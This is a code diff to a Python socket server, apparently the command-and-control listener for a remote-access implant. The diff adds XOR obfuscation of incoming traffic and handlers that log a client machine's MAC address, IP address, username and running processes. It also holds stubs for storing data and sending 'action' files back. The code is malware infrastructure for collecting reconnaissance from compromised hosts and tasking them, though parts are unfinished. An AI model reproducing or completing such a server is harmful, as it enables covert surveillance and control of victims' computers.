@@ -1,9 +1,19 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
+# -*- coding: utf-8 -*-`
 
 import socket
 import sys
 from _thread import *
+
+def xor_crypto(data):
+    key = b'i' * len(data)
+    int_data = int.from_bytes(data, sys.byteorder)
+    int_key = int.from_bytes(key, sys.byteorder)
+    int_enc = int_data ^ int_key
+    return int_enc.to_bytes(len(data), sys.byteorder)
+
+#print(xor_crypto(b'dad'))
+#print(xor_crypto(b'\r\x08\r'))
 
 HOST = ''
 PORT = 1337
@@ -20,7 +30,9 @@ print('[+] Socket now listening')
 #Function for handling connections. This will be used to create threads
 def clientthread(conn):
     while True:
-        data = conn.recv(4096)
+        data = xor_crypto(conn.recv(4096))
+
+        #print("DEBUG\n" + str(data) + "\nDEBUG\n")
 
         data_len = len(data)
         print("[+] Recieved " + str(data_len) + " bytes of data")
@@ -31,6 +43,7 @@ def clientthread(conn):
 
 
         token = data[0:8]
+        print(token)
         conn_type = data[8:16]
         client_data = data[16:data_len]
 
@@ -46,6 +59,15 @@ def clientthread(conn):
         if conn_type == b'12345678':
             #Connection type used for testing
             print("[D] Connection Type: TEST (12345678)")
+        elif conn_type == b'MACCADDR':
+            #Mac address incoming
+            print("[D] MAC Address: " + str(client_data[:17]) + '\n')
+        elif conn_type == b'IPIPADDR':
+            print("[D] IP Address: " + str(client_data[:15]) + '\n')
+        elif conn_type == b'USERNAME':
+            print("[D] Username: " + str(client_data[:32]) + '\n')
+        elif conn_type == b'PROCSPLZ':
+            print("[D] Running Processes: " + str(client_data) + '\n')
         elif conn_type == b'STORETXT':
             print("[D] Connection Type: STORE TEXT (STORETXT)")
             #TODO actually store the data
@@ -55,7 +77,7 @@ def clientthread(conn):
             #TODO check ./actions/ for action files send them back to the client
             print("[+] Action Requested")
         else:
-            print("[?] Unknown connection type: " + str(conn_type))
+            print("[?] Unknown connection type: " + conn_type.decode('ascii'))
 
     conn.close()
 
